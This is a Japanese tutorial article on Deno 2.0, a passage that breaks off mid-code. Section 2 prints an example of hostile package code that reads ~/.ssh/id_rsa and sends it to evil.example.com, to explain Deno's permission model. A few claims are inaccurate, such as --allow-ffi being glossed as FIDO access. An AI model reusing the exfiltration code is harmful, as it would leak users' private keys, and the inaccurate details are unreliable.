---
title: 'Deno 2.0完全ガイド：次世代JavaScript/TypeScriptランタイム'
description: 'Deno 2.0の新機能を徹底解説。Node.js互換性・npm対応・パッケージマネージャー・Fresh・Deno Deploy・テスト・セキュリティモデルまで実践的に学ぶ'
pubDate: 'Feb 20 2026'
heroImage: '../../assets/blog-placeholder-2.jpg'
tags: ['Deno', 'JavaScript', 'Runtime']
---

Deno 2.0は2024年10月にリリースされた、JavaScript/TypeScriptランタイムの新世代を代表する実装です。Node.jsの設計上の問題点を根本から解決しつつ、Node.jsエコシステムとの完全な互換性を実現した本バージョンは、バックエンド開発のあり方を大きく変える可能性を秘めています。本記事では、Deno 2.0の全機能を実践的なコード例とともに徹底的に解説します。

## 目次

1. Deno 2.0とは何か
2. Node.jsとの根本的な違い
3. インストールとセットアップ
4. Deno 2.0の主要な新機能
5. 基本的な使い方とパーミッションシステム
6. モジュールシステムの詳細
7. 標準ライブラリ（@std）の活用
8. HTTPサーバーの構築
9. Freshフレームワークによるウェブ開発
10. データベース連携
11. テストとカバレッジ
12. Deno Deployによるエッジデプロイ
13. パフォーマンス比較
14. Node.jsからの移行ガイド
15. ベストプラクティス

---

## 1. Deno 2.0とは何か

Deno（ディーノ）は、Node.jsの生みの親であるRyan Dahlが2018年に発表した新世代のJavaScript/TypeScriptランタイムです。Ryan Dahl自身がNode.jsの設計上の後悔について語った有名な講演「10 Things I Regret About Node.js」を基に、ゼロから設計し直されました。

### Denoの設計哲学

Denoの核心にある設計哲学は以下の3点です。

**セキュリティファースト**: デフォルトでファイルシステム、ネットワーク、環境変数へのアクセスが禁止されています。必要な権限は明示的に宣言する必要があります。これにより、悪意のある依存パッケージが勝手にファイルを読み書きしたりネットワークアクセスを行ったりすることを防ぎます。

**TypeScriptネイティブ**: 設定ファイル不要でTypeScriptを直接実行できます。Node.jsがTypeScriptを実行するためにts-nodeやesbuildといったツールを必要とするのとは対照的です。

**Web標準準拠**: FetchAPI、WebCrypto、WebStreams、URLSearchParamsなど、ブラウザと同じWeb標準APIを実装しています。ブラウザで動くコードがそのままDenoでも動作します。

### Deno 2.0の位置付け

2024年10月にリリースされたDeno 2.0は、初期バージョンから大きく進化しました。最大の変化はNode.jsおよびnpmエコシステムとの完全な互換性の実現です。これにより、既存のNode.jsプロジェクトをほぼそのままDenoで実行できるようになりました。

```typescript
// Deno 2.0では以下のようなNode.js向けコードが動作する
import express from "npm:express@4";
import { readFileSync } from "node:fs";
import path from "node:path";

const app = express();

app.get("/", (req, res) => {
  res.send("Hello from Deno 2.0 with Express!");
});

app.listen(3000, () => {
  console.log("Server running on port 3000");
});
```

---

## 2. Node.jsとの根本的な違い

### セキュリティモデルの違い

Node.jsはデフォルトでほぼすべてのシステムリソースへのアクセスが許可されています。これは開発の利便性を高める一方で、`npm install`したパッケージが知らないうちに悪意ある動作を行うリスクがあります。

実際に2021年以降、npmパッケージに悪意あるコードが埋め込まれるサプライチェーン攻撃が多発しています。

```bash
# Node.jsではこのコードは制限なく実行される
# 攻撃者がパッケージに仕込んだコード例
const fs = require('fs');
const https = require('https');

// ホームディレクトリの.ssh/id_rsaを外部に送信できてしまう
fs.readFile(process.env.HOME + '/.ssh/id_rsa', (err, data) => {
  if (!err) {
    https.request({
      hostname: 'evil.example.com',
      path: '/steal',
      method: 'POST'
    }).write(data);
  }
});
```

Denoではこの種の攻撃は、パーミッションフラグなしには実行できません。

```bash
# Denoではパーミッションが必要
deno run --allow-read --allow-net malicious.ts
# パーミッションを付与しなければファイル読み取りもネット送信も不可
deno run malicious.ts  # PermissionDeniedエラー
```

### TypeScript対応の違い

Node.jsでTypeScriptを実行するには、追加のツールチェーンが必要です。

```bash
# Node.jsでTypeScriptを実行する場合
npm install -D typescript ts-node @types/node
npx ts-node src/index.ts

# または
npm install -D tsx
npx tsx src/index.ts
```

Denoでは設定不要です。

```bash
# Denoでは直接実行できる
deno run index.ts
```

### パッケージ管理の違い

Node.jsのnpmは`node_modules`ディレクトリにパッケージをインストールします。このアプローチには以下の問題があります。

- `node_modules`が肥大化する（数百MBになることも）
- プロジェクトごとに同じパッケージが重複インストールされる
- `package-lock.json`の管理が複雑

Denoはデフォルトでグローバルキャッシュを使用します。同じパッケージは一度だけダウンロードされ、すべてのプロジェクトで共有されます。

```typescript
// Denoのインポート（URLベース - Deno 1.x時代）
import { serve } from "https://deno.land/std@0.208.0/http/server.ts";

// Deno 2.0ではnpmパッケージも使用可能
import lodash from "npm:lodash@4.17.21";

// Node.js組み込みモジュールもサポート
import { EventEmitter } from "node:events";
```

### モジュール解決の違い

Node.jsは`require()`とCommonJS形式を長年使用してきましたが、ESModulesへの移行が遅れ、`.mjs`と`.cjs`が混在する複雑な状況になっています。

DenoはESModulesのみをサポートし、拡張子の明示が必要です。

```typescript
// Denoでは拡張子が必須
import { helper } from "./utils.ts";  // 正しい
import { helper } from "./utils";     // エラー（Deno 1.x）

// Deno 2.0ではNode.js互換モードで拡張子省略も可能
```

---

## 3. インストールとセットアップ

### macOSへのインストール

```bash
# curlを使用したインストール
curl -fsSL https://deno.land/install.sh | sh

# Homebrewを使用したインストール
brew install deno

# インストール確認
deno --version
# deno 2.0.0 (stable, release, aarch64-apple-darwin)
# v8 13.0.245.12
# typescript 5.6.2
```

### Windowsへのインストール

```powershell
# PowerShellを使用したインストール
irm https://deno.land/install.ps1 | iex

# wingetを使用したインストール
winget install DenoLand.Deno

# scoopを使用したインストール
scoop install deno
```

### Linuxへのインストール

```bash
# curlを使用したインストール
curl -fsSL https://deno.land/install.sh | sh

# aptを使用したインストール（Ubuntu/Debian）
sudo snap install deno

# パスの設定（~/.bashrc または ~/.zshrc に追加）
export DENO_INSTALL="$HOME/.deno"
export PATH="$DENO_INSTALL/bin:$PATH"
```

### バージョン管理ツール（dvm）

複数のDenoバージョンを管理したい場合はdvmを使用します。

```bash
# dvmのインストール
curl -fsSL https://dvm.deno.dev | sh

# 特定バージョンのインストール
dvm install 2.0.0

# バージョンの切り替え
dvm use 2.0.0

# インストール済みバージョンの確認
dvm ls
```

### エディタの設定

#### VS Code

```bash
# Deno公式拡張機能をインストール
code --install-extension denoland.vscode-deno
```

プロジェクトルートに`.vscode/settings.json`を作成します。

```json
{
  "deno.enable": true,
  "deno.lint": true,
  "deno.unstable": false,
  "deno.suggest.imports.hosts": {
    "https://deno.land": true,
    "https://esm.sh": true
  },
  "[typescript]": {
    "editor.defaultFormatter": "denoland.vscode-deno"
  },
  "[typescriptreact]": {
    "editor.defaultFormatter": "denoland.vscode-deno"
  }
}
```

#### deno.jsonの設定

プロジェクトルートに`deno.json`を作成することで、プロジェクト設定を管理できます。

```json
{
  "compilerOptions": {
    "allowJs": true,
    "lib": ["deno.window"],
    "strict": true
  },
  "lint": {
    "include": ["src/"],
    "exclude": ["src/testdata/", "data/fixtures/"],
    "rules": {
      "tags": ["recommended"],
      "include": ["ban-untagged-todo"],
      "exclude": ["no-unused-vars"]
    }
  },
  "fmt": {
    "useTabs": false,
    "lineWidth": 80,
    "indentWidth": 2,
    "singleQuote": false,
    "proseWrap": "preserve",
    "include": ["src/"],
    "exclude": ["src/testdata/"]
  },
  "test": {
    "include": ["src/"],
    "exclude": ["src/testdata/"]
  },
  "tasks": {
    "dev": "deno run --allow-net --allow-read --watch src/main.ts",
    "build": "deno run --allow-net --allow-read --allow-write build.ts",
    "test": "deno test --allow-net --allow-read",
    "lint": "deno lint",
    "fmt": "deno fmt"
  },
  "imports": {
    "@std/": "jsr:@std/",
    "@/": "./src/"
  }
}
```

---

## 4. Deno 2.0の主要な新機能

### Node.js互換性の完全実現

Deno 2.0の最大の変化は、Node.jsとの互換性が大幅に向上したことです。`node:`プレフィックスを使用することで、Node.jsの組み込みモジュールをそのまま使用できます。

```typescript
// Node.js組み込みモジュールの使用
import { readFileSync, writeFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { createHash } from "node:crypto";
import { EventEmitter } from "node:events";
import { Readable, Writable } from "node:stream";
import http from "node:http";
import https from "node:https";
import os from "node:os";
import process from "node:process";
import { Buffer } from "node:buffer";

// process.envへのアクセス
const port = process.env.PORT || "3000";
console.log(`Running on port: ${port}`);

// Bufferの使用
const buf = Buffer.from("Hello, Deno!", "utf8");
console.log(buf.toString("base64"));

// cryptoでハッシュ計算
const hash = createHash("sha256");
hash.update("Hello, Deno!");
console.log(hash.digest("hex"));
```

### npmパッケージの使用

`npm:`スペシファイアを使用することで、npmのパッケージをそのまま使用できます。

```typescript
// npm パッケージの使用（インストール不要）
import express from "npm:express@4";
import { z } from "npm:zod@3";
import axios from "npm:axios@1";
import lodash from "npm:lodash@4";
import dayjs from "npm:dayjs@1";

// Zodによるバリデーション
const UserSchema = z.object({
  id: z.number(),
  name: z.string().min(1).max(100),
  email: z.string().email(),
  age: z.number().min(0).max(150).optional(),
});

type User = z.infer<typeof UserSchema>;

const rawData = {
  id: 1,
  name: "田中太郎",
  email: "tanaka@example.com",
  age: 30,
};

const result = UserSchema.safeParse(rawData);
if (result.success) {
  console.log("バリデーション成功:", result.data);
} else {
  console.error("バリデーションエラー:", result.error.issues);
}

// dayjsによる日付処理
const now = dayjs();
console.log(now.format("YYYY-MM-DD HH:mm:ss"));
console.log(now.add(7, "day").format("YYYY-MM-DD"));
```

### JSRレジストリの統合

JSR（JavaScript Registry）は、DenoとNode.jsの両方で使用できる新しいパッケージレジストリです。

```typescript
// JSRからのインポート
import { encodeBase64, decodeBase64 } from "jsr:@std/encoding@1";
import { assert, assertEquals } from "jsr:@std/assert@1";
import { walk } from "jsr:@std/fs@1";
import { format } from "jsr:@std/datetime@1";

// エンコード/デコード
const encoded = encodeBase64("Hello, World!");
console.log(encoded);  // SGVsbG8sIFdvcmxkIQ==

const decoded = decodeBase64(encoded);
console.log(new TextDecoder().decode(decoded));  // Hello, World!

// 日付フォーマット
const date = new Date();
console.log(format(date, "yyyy-MM-dd HH:mm:ss"));
```

### deno.json インポートマップ

`deno.json`の`imports`フィールドを使用してインポートエイリアスを定義できます。

```json
{
  "imports": {
    "@/": "./src/",
    "@std/": "jsr:@std/",
    "zod": "npm:zod@3",
    "hono": "npm:hono@4",
    "lodash": "npm:lodash@4"
  }
}
```

```typescript
// エイリアスを使用したインポート
import { UserService } from "@/services/user.ts";
import { assertEquals } from "@std/assert";
import { z } from "zod";
import { Hono } from "hono";
```

### workspaceサポート

Deno 2.0ではmonorepo構造をサポートするworkspace機能が導入されました。

```json
// ルートのdeno.json
{
  "workspace": [
    "./packages/core",
    "./packages/cli",
    "./packages/server"
  ]
}
```

```
project/
├── deno.json          (ワークスペースルート)
├── packages/
│   ├── core/
│   │   ├── deno.json
│   │   └── src/
│   ├── cli/
│   │   ├── deno.json
│   │   └── src/
│   └── server/
│       ├── deno.json
│       └── src/
```

---

## 5. 基本的な使い方とパーミッションシステム

### スクリプトの実行

```bash
# TypeScriptファイルの実行
deno run main.ts

# JavaScriptファイルの実行
deno run main.js

# URLから直接実行
deno run https://deno.land/std/examples/welcome.ts

# ウォッチモードで実行（ファイル変更時に自動再起動）
deno run --watch main.ts

# V8フラグの指定
deno run --v8-flags=--max-old-space-size=4096 main.ts
```

### パーミッションシステムの詳細

```bash
# ファイルシステムへのアクセス
deno run --allow-read main.ts              # 全読み取り許可
deno run --allow-read=/tmp main.ts         # /tmpのみ読み取り許可
deno run --allow-write main.ts             # 全書き込み許可
deno run --allow-write=/output main.ts     # /outputのみ書き込み許可

# ネットワークアクセス
deno run --allow-net main.ts               # 全ネットワーク許可
deno run --allow-net=api.example.com main.ts  # 特定ホストのみ許可

# 環境変数へのアクセス
deno run --allow-env main.ts               # 全環境変数許可
deno run --allow-env=PORT,HOST main.ts     # 特定変数のみ許可

# サブプロセスの実行
deno run --allow-run main.ts               # 全サブプロセス許可
deno run --allow-run=git,npm main.ts       # 特定コマンドのみ許可

# 高レベルシステム情報へのアクセス
deno run --allow-sys main.ts

# ダイナミックインポートの許可
deno run --allow-import main.ts

# FIDO認証器へのアクセス
deno run --allow-ffi main.ts

# 全権限許可（危険：開発時のみ使用）
deno run --allow-all main.ts
deno run -A main.ts
```

### パーミッションをコードから確認する

```typescript
// パーミッション状態の確認
const readStatus = await Deno.permissions.query({ name: "read", path: "/tmp" });
console.log("読み取りパーミッション:", readStatus.state);
// "granted" | "denied" | "prompt"

// パーミッションの要求
const netStatus = await Deno.permissions.request({ name: "net", host: "api.example.com" });
if (netStatus.state === "granted") {
  // ネットワークアクセス可能
  const response = await fetch("https://api.example.com/data");
  const data = await response.json();
  console.log(data);
} else {
  console.error("ネットワークアクセスが拒否されました");
}

// パーミッションの取り消し
await Deno.permissions.revoke({ name: "net", host: "api.example.com" });
```

### 環境変数の操作

```typescript
// 環境変数の取得
const port = Deno.env.get("PORT") ?? "3000";
const nodeEnv = Deno.env.get("NODE_ENV") ?? "development";
const databaseUrl = Deno.env.get("DATABASE_URL");

if (!databaseUrl) {
  throw new Error("DATABASE_URL環境変数が設定されていません");
}

// 全環境変数の取得
const allEnv = Deno.env.toObject();
console.log(allEnv);

// 環境変数の設定
Deno.env.set("MY_VAR", "my_value");

// 環境変数の削除
Deno.env.delete("MY_VAR");

// .envファイルの読み込み（@std/dotenvを使用）
import { load } from "jsr:@std/dotenv@0";

const env = await load({ envPath: ".env" });
console.log(env.DATABASE_URL);
```

### ファイルシステムの操作

```typescript
// ファイルの読み書き
const encoder = new TextEncoder();
const decoder = new TextDecoder();

// テキストファイルの書き込み
await Deno.writeTextFile("output.txt", "Hello, Deno 2.0!\n");

// テキストファイルの読み込み
const content = await Deno.readTextFile("output.txt");
console.log(content);

// バイナリファイルの読み書き
const data = encoder.encode("Binary data");
await Deno.writeFile("data.bin", data);
const binaryContent = await Deno.readFile("data.bin");
console.log(decoder.decode(binaryContent));

// ディレクトリの作成
await Deno.mkdir("new-dir", { recursive: true });

// ファイル情報の取得
const fileInfo = await Deno.stat("output.txt");
console.log("ファイルサイズ:", fileInfo.size, "bytes");
console.log("更新日時:", fileInfo.mtime);

// ディレクトリの内容を列挙
for await (const entry of Deno.readDir(".")) {
  console.log(entry.name, entry.isDirectory ? "(dir)" : "(file)");
}

// ファイルの削除
await Deno.remove("output.txt");
await Deno.remove("new-dir", { recursive: true });

// ファイルのコピー
await Deno.copyFile("source.txt", "destination.txt");

// ファイルのリネーム/移動
await Deno.rename("old-name.txt", "new-name.txt");
```

---

## 6. モジュールシステムの詳細

### ESモジュールの基本

DenoはESModulesのみをサポートします。CommonJS（`require()`）は直接サポートされませんが、`node:`プレフィックスを使用したNode.js互換モードでは動作します。

```typescript
// 名前付きエクスポート
export function greet(name: string): string {
  return `こんにちは、${name}！`;
}

export const PI = 3.14159;

export type Point = {
  x: number;
  y: number;
};

// デフォルトエクスポート
export default class Calculator {
  add(a: number, b: number): number {
    return a + b;
  }

  subtract(a: number, b: number): number {
    return a - b;
  }

  multiply(a: number, b: number): number {
    return a * b;
  }

  divide(a: number, b: number): number {
    if (b === 0) throw new Error("ゼロ除算エラー");
    return a / b;
  }
}
```

```typescript
// インポートの様々な形式
import Calculator, { greet, PI, type Point } from "./calculator.ts";

// 名前空間インポート
import * as MathUtils from "./math-utils.ts";

// 動的インポート
const module = await import("./dynamic-module.ts");

// 型のみのインポート（コンパイル後に削除される）
import type { User } from "./types.ts";

// サイドエフェクトのみのインポート
import "./polyfills.ts";
```

### URLインポート

```typescript
// deno.land/stdからのインポート
import { assertEquals } from "https://deno.land/std@0.208.0/assert/mod.ts";

// esm.shからのインポート
import React from "https://esm.sh/react@18.2.0";
import { useState, useEffect } from "https://esm.sh/react@18.2.0";

// skypackからのインポート
import lodash from "https://cdn.skypack.dev/lodash@4.17.21";
```

### インポートマップの詳細活用

```json
{
  "imports": {
    "react": "https://esm.sh/react@18.2.0",
    "react-dom/server": "https://esm.sh/react-dom@18.2.0/server",
    "preact": "https://esm.sh/preact@10.19.3",
    "preact/hooks": "https://esm.sh/preact@10.19.3/hooks",
    "hono": "npm:hono@4",
    "hono/middleware": "npm:hono@4/middleware",
    "@/": "./src/",
    "@components/": "./src/components/",
    "@utils/": "./src/utils/",
    "@types/": "./src/types/"
  },
  "scopes": {
    "./packages/legacy/": {
      "react": "https://esm.sh/react@17.0.2"
    }
  }
}
```

### モジュールバンドラーとしての使用

```bash
# 単一ファイルにバンドル
deno bundle src/main.ts dist/bundle.js

# 実行可能バイナリにコンパイル
deno compile --allow-net --allow-read src/main.ts -o dist/myapp

# クロスコンパイル（別プラットフォーム向け）
deno compile --target x86_64-pc-windows-msvc --allow-net src/main.ts -o dist/myapp.exe
deno compile --target x86_64-unknown-linux-gnu --allow-net src/main.ts -o dist/myapp-linux
deno compile --target aarch64-apple-darwin --allow-net src/main.ts -o dist/myapp-macos
```

---

## 7. 標準ライブラリ（@std）の活用

Deno 2.0から標準ライブラリはJSRレジストリ（`jsr:@std/`）で提供されています。

### @std/assert - アサーション

```typescript
import {
  assert,
  assertEquals,
  assertNotEquals,
  assertStrictEquals,
  assertThrows,
  assertRejects,
  assertExists,
  assertInstanceOf,
  assertMatch,
  assertArrayIncludes,
  assertObjectMatch,
} from "jsr:@std/assert@1";

// 基本的なアサーション
assert(true, "これはtrueであるべき");
assertEquals(1 + 1, 2, "足し算の確認");
assertNotEquals("hello", "world");

// 厳密な等価性（===）
assertStrictEquals(1, 1);
// assertStrictEquals(1, "1"); // 失敗

// null/undefinedでないことの確認
const value: string | null = "hello";
assertExists(value);

// 型の確認
assertInstanceOf(new Date(), Date);

// 正規表現マッチング
assertMatch("hello world", /hello/);

// 配列の包含確認
assertArrayIncludes([1, 2, 3, 4], [2, 4]);

// オブジェクトの部分一致
assertObjectMatch(
  { name: "田中", age: 30, email: "tanaka@example.com" },
  { name: "田中", age: 30 }
);

// 例外のテスト
assertThrows(
  () => {
    throw new TypeError("型エラー");
  },
  TypeError,
  "型エラー"
);

// 非同期例外のテスト
await assertRejects(
  async () => {
    await Promise.reject(new Error("非同期エラー"));
  },
  Error,
  "非同期エラー"
);
```

### @std/fs - ファイルシステム

```typescript
import {
  ensureDir,
  ensureFile,
  exists,
  copy,
  move,
  emptyDir,
  walk,
  expandGlob,
} from "jsr:@std/fs@1";

// ディレクトリの確実な作成
await ensureDir("./dist/assets/images");

// ファイルの確実な作成（中間ディレクトリも作成）
await ensureFile("./dist/config/settings.json");

// ファイル/ディレクトリの存在確認
const fileExists = await exists("./config.json");
console.log("設定ファイルが存在:", fileExists);

// ディレクトリのコピー
await copy("./src", "./backup/src", { overwrite: true });

// ファイル/ディレクトリの移動
await move("./old-dir", "./new-dir");

// ディレクトリを空にする
await emptyDir("./tmp");

// ファイルツリーの再帰的な走査
for await (const entry of walk("./src", {
  exts: [".ts", ".tsx"],
  skip: [/node_modules/],
})) {
  console.log(entry.path);
}

// グロブパターンでのファイル検索
for await (const file of expandGlob("./src/**/*.test.ts")) {
  console.log("テストファイル:", file.path);
}
```

### @std/path - パス操作

```typescript
import {
  join,
  resolve,
  dirname,
  basename,
  extname,
  relative,
  isAbsolute,
  normalize,
  fromFileUrl,
  toFileUrl,
} from "jsr:@std/path@1";

// パスの結合
const fullPath = join("/home", "user", "documents", "file.txt");
console.log(fullPath);  // /home/user/documents/file.txt

// 絶対パスへの解決
const absolutePath = resolve("./src/main.ts");
console.log(absolutePath);

// ディレクトリ名の取得
console.log(dirname("/home/user/file.txt"));  // /home/user

// ファイル名の取得
console.log(basename("/home/user/file.txt"));      // file.txt
console.log(basename("/home/user/file.txt", ".txt")); // file

// 拡張子の取得
console.log(extname("file.ts"));   // .ts
console.log(extname("file"));      // ""

// 相対パスの計算
console.log(relative("/home/user", "/home/user/docs/file.txt"));  // docs/file.txt

// 絶対パス判定
console.log(isAbsolute("/home/user"));  // true
console.log(isAbsolute("./relative"));  // false

// import.metaからのファイルパス取得
const __filename = fromFileUrl(import.meta.url);
const __dirname = dirname(__filename);
console.log("カレントディレクトリ:", __dirname);
```

### @std/http - HTTPユーティリティ

```typescript
import { STATUS_CODE, STATUS_TEXT } from "jsr:@std/http@1/status";
import { Cookie, getCookies, setCookie, deleteCookie } from "jsr:@std/http@1/cookie";
import { contentType } from "jsr:@std/http@1/content-type";

// HTTPステータスコード
console.log(STATUS_CODE.OK);          // 200
console.log(STATUS_CODE.NotFound);    // 404
console.log(STATUS_CODE.InternalServerError);  // 500

// ステータステキスト
console.log(STATUS_TEXT[200]);  // "OK"
console.log(STATUS_TEXT[404]);  // "Not Found"

// コンテンツタイプの取得
console.log(contentType(".json"));  // "application/json; charset=UTF-8"
console.log(contentType(".html"));  // "text/html; charset=UTF-8"
console.log(contentType(".png"));   // "image/png"

// Cookieの操作
const request = new Request("https://example.com", {
  headers: {
    Cookie: "session=abc123; user=tanaka",
  },
});

const cookies = getCookies(request.headers);
console.log(cookies);  // { session: "abc123", user: "tanaka" }

const response = new Response("OK");
setCookie(response.headers, {
  name: "session",
  value: "new-session-value",
  httpOnly: true,
  secure: true,
  sameSite: "Strict",
  maxAge: 3600,
});
```

### @std/encoding - エンコーディング

```typescript
import { encodeBase64, decodeBase64 } from "jsr:@std/encoding@1/base64";
import { encodeBase64Url, decodeBase64Url } from "jsr:@std/encoding@1/base64url";
import { encodeHex, decodeHex } from "jsr:@std/encoding@1/hex";
import { encode as encodeCsv, decode as decodeCsv } from "jsr:@std/csv@1";

// Base64エンコード/デコード
const text = "こんにちは、Deno！";
const encoded = encodeBase64(new TextEncoder().encode(text));
console.log("Base64:", encoded);

const decoded = decodeBase64(encoded);
console.log("デコード:", new TextDecoder().decode(decoded));

// 16進数エンコード
const hexEncoded = encodeHex(new TextEncoder().encode("Hello"));
console.log("Hex:", hexEncoded);  // 48656c6c6f

// CSVのエンコード/デコード
const csvData = [
  ["名前", "年齢", "メール"],
  ["田中太郎", "30", "tanaka@example.com"],
  ["山田花子", "25", "yamada@example.com"],
];

const csvString = encodeCsv(csvData);
console.log(csvString);
```

---

## 8. HTTPサーバーの構築

### Deno.serveの基本

```typescript
// シンプルなHTTPサーバー
Deno.serve({ port: 3000 }, (req: Request) => {
  return new Response("Hello, World!", {
    status: 200,
    headers: {
      "Content-Type": "text/plain; charset=utf-8",
    },
  });
});

console.log("サーバーが起動しました: http://localhost:3000");
```

### ルーティングの実装

```typescript
interface RouteHandler {
  method: string;
  pattern: URLPattern;
  handler: (req: Request, params: Record<string, string>) => Response | Promise<Response>;
}

class Router {
  private routes: RouteHandler[] = [];

  get(path: string, handler: (req: Request, params: Record<string, string>) => Response | Promise<Response>) {
    this.routes.push({
      method: "GET",
      pattern: new URLPattern({ pathname: path }),
      handler,
    });
  }

  post(path: string, handler: (req: Request, params: Record<string, string>) => Response | Promise<Response>) {
    this.routes.push({
      method: "POST",
      pattern: new URLPattern({ pathname: path }),
      handler,
    });
  }

  async handle(req: Request): Promise<Response> {
    const url = new URL(req.url);

    for (const route of this.routes) {
      if (route.method !== req.method) continue;

      const match = route.pattern.exec(url);
      if (match) {
        const params = match.pathname.groups as Record<string, string>;
        return await route.handler(req, params);
      }
    }

    return new Response("Not Found", { status: 404 });
  }
}

// ユーザーデータ（実際はDBを使用）
const users = new Map<string, { id: string; name: string; email: string }>();

const router = new Router();

// ユーザー一覧の取得
router.get("/api/users", (_req) => {
  const userList = Array.from(users.values());
  return new Response(JSON.stringify(userList), {
    headers: { "Content-Type": "application/json; charset=utf-8" },
  });
});

// ユーザーの取得
router.get("/api/users/:id", (_req, params) => {
  const user = users.get(params.id);
  if (!user) {
    return new Response(JSON.stringify({ error: "ユーザーが見つかりません" }), {
      status: 404,
      headers: { "Content-Type": "application/json; charset=utf-8" },
    });
  }
  return new Response(JSON.stringify(user), {
    headers: { "Content-Type": "application/json; charset=utf-8" },
  });
});

// ユーザーの作成
router.post("/api/users", async (req) => {
  const body = await req.json();
  const id = crypto.randomUUID();
  const user = { id, name: body.name, email: body.email };
  users.set(id, user);

  return new Response(JSON.stringify(user), {
    status: 201,
    headers: { "Content-Type": "application/json; charset=utf-8" },
  });
});

// サーバーの起動
Deno.serve({ port: 3000 }, (req) => router.handle(req));
```

### Honoフレームワークの使用

HonoはDenoとNode.jsの両方で動作する、軽量で高速なWebフレームワークです。

```typescript
import { Hono } from "npm:hono@4";
import { cors } from "npm:hono@4/cors";
import { logger } from "npm:hono@4/logger";
import { jwt } from "npm:hono@4/jwt";
import { validator } from "npm:hono@4/validator";
import { z } from "npm:zod@3";

// アプリケーションの作成
const app = new Hono();

// ミドルウェアの設定
app.use("*", logger());
app.use("/api/*", cors({
  origin: ["https://example.com", "http://localhost:3000"],
  allowMethods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowHeaders: ["Content-Type", "Authorization"],
}));

// JWT認証ミドルウェア
const SECRET_KEY = Deno.env.get("JWT_SECRET") || "development-secret";

app.use("/api/protected/*", jwt({ secret: SECRET_KEY }));

// バリデーションスキーマ
const CreateUserSchema = z.object({
  name: z.string().min(1, "名前は必須です"),
  email: z.string().email("有効なメールアドレスを入力してください"),
  age: z.number().min(0).max(150).optional(),
});

// ルートの定義
app.get("/", (c) => c.text("Hono on Deno 2.0!"));

app.get("/api/health", (c) => {
  return c.json({
    status: "healthy",
    timestamp: new Date().toISOString(),
    runtime: "Deno " + Deno.version.deno,
  });
});

// ユーザー作成エンドポイント（バリデーション付き）
app.post("/api/users", validator("json", (value, c) => {
  const result = CreateUserSchema.safeParse(value);
  if (!result.success) {
    return c.json({ errors: result.error.issues }, 400);
  }
  return result.data;
}), async (c) => {
  const data = c.req.valid("json");
  const user = {
    id: crypto.randomUUID(),
    ...data,
    createdAt: new Date().toISOString(),
  };

  // DBへの保存（ここではKVを使用）
  const kv = await Deno.openKv();
  await kv.set(["users", user.id], user);

  return c.json(user, 201);
});

// 保護されたルート
app.get("/api/protected/profile", (c) => {
  const payload = c.get("jwtPayload");
  return c.json({ message: "認証済みユーザー", userId: payload.sub });
});

// エラーハンドリング
app.onError((err, c) => {
  console.error("エラー:", err);
  return c.json({
    error: "内部サーバーエラーが発生しました",
    message: err.message,
  }, 500);
});

// 404ハンドリング
app.notFound((c) => {
  return c.json({ error: "リソースが見つかりません" }, 404);
});

// サーバーの起動
Deno.serve({ port: 3000 }, app.fetch);
console.log("Honoサーバーが起動しました: http://localhost:3000");
```

### WebSocketサーバー

```typescript
const app = new Map<WebSocket, { id: string; username: string }>();

Deno.serve({ port: 8080 }, (req) => {
  const url = new URL(req.url);

  if (url.pathname === "/ws") {
    const { socket, response } = Deno.upgradeWebSocket(req);
    const clientId = crypto.randomUUID();

    socket.onopen = () => {
      console.log(`クライアント接続: ${clientId}`);
      socket.send(JSON.stringify({ type: "welcome", id: clientId }));
    };

    socket.onmessage = (event) => {
      const message = JSON.parse(event.data);

      if (message.type === "join") {
        app.set(socket, { id: clientId, username: message.username });
        // 全クライアントに通知
        broadcast({
          type: "user_joined",
          username: message.username,
          timestamp: new Date().toISOString(),
        });
      } else if (message.type === "chat") {
        const client = app.get(socket);
        if (client) {
          broadcast({
            type: "chat",
            username: client.username,
            message: message.text,
            timestamp: new Date().toISOString(),
          });
        }
      }
    };

    socket.onclose = () => {
      const client = app.get(socket);
      if (client) {
        console.log(`クライアント切断: ${client.username}`);
        app.delete(socket);
        broadcast({
          type: "user_left",
          username: client.username,
          timestamp: new Date().toISOString(),
        });
      }
    };

    socket.onerror = (error) => {
      console.error("WebSocketエラー:", error);
    };

    return response;
  }

  return new Response("Not Found", { status: 404 });
});

function broadcast(data: unknown) {
  const message = JSON.stringify(data);
  for (const [socket] of app) {
    if (socket.readyState === WebSocket.OPEN) {
      socket.send(message);
    }
  }
}

console.log("WebSocketサーバーが起動しました: ws://localhost:8080/ws");
```

---

## 9. Freshフレームワークによるウェブ開発

FreshはDenoネイティブのフルスタックWebフレームワークです。Next.jsに似たファイルシステムベースのルーティングを採用しており、Islands Architectureにより必要な部分だけをクライアントサイドでハイドレーションします。

### Freshプロジェクトの作成

```bash
# Freshプロジェクトの作成
deno run -A -r https://fresh.deno.dev my-fresh-app

# プロジェクト構造
my-fresh-app/
├── deno.json
├── dev.ts           (開発サーバー)
├── main.ts          (本番サーバー)
├── fresh.config.ts  (Fresh設定)
├── routes/          (ページルート)
│   ├── index.tsx
│   ├── about.tsx
│   └── api/
│       └── hello.ts
├── islands/         (インタラクティブコンポーネント)
│   └── Counter.tsx
└── static/          (静的ファイル)
    └── styles.css
```

```bash
# 開発サーバーの起動
deno task start
```

### ルートの定義

```typescript
// routes/index.tsx - トップページ
import { FreshContext, Handlers, PageProps } from "$fresh/server.ts";

interface Article {
  id: number;
  title: string;
  summary: string;
  publishedAt: string;
}

export const handler: Handlers<Article[]> = {
  async GET(_req, ctx) {
    // APIからデータを取得
    const response = await fetch("https://api.example.com/articles");
    const articles: Article[] = await response.json();
    return ctx.render(articles);
  },
};

export default function Home({ data: articles }: PageProps<Article[]>) {
  return (
    <div class="max-w-4xl mx-auto px-4 py-8">
      <h1 class="text-3xl font-bold mb-8">最新記事</h1>
      <div class="grid gap-6">
        {articles.map((article) => (
          <article key={article.id} class="border rounded-lg p-6">
            <h2 class="text-xl font-semibold mb-2">
              <a href={`/articles/${article.id}`} class="hover:underline">
                {article.title}
              </a>
            </h2>
            <p class="text-gray-600 mb-3">{article.summary}</p>
            <time class="text-sm text-gray-500">{article.publishedAt}</time>
          </article>
        ))}
      </div>
    </div>
  );
}
```

```typescript
// routes/articles/[id].tsx - 記事詳細ページ（動的ルート）
import { Handlers, PageProps } from "$fresh/server.ts";
import { Head } from "$fresh/runtime.ts";

interface Article {
  id: number;
  title: string;
  content: string;
  author: string;
  publishedAt: string;
}

export const handler: Handlers<Article | null> = {
  async GET(_req, ctx) {
    const id = ctx.params.id;
    const response = await fetch(`https://api.example.com/articles/${id}`);

